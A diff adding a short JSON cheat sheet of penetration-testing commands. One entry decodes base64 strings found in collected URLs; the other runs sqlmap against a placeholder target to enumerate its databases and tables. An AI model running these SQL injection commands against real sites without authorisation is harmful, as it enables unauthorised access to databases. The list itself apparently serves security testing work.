@@ -1,0 +1,17 @@
+[
+    {
+        "title": "Base64 Methodology",
+        "commands": [
+            "cat allurls.txt | gf base64 | tee base64.txt",
+            "cat base64.txt | awk -F: '{print $3}' ",
+            "while read line; do echo \"$line\" | base64 -d; echo; done < base64.txt"
+        ]
+    },
+    {
+        "title": "SQLi Methodology",
+        "commands": [
+            "sqlmap -u 'http://target.com/index.php?id=1' --dbs",
+            "sqlmap -u 'http://target.com/index.php?id=1' -D dbname --tables"
+        ]
+    }
+]
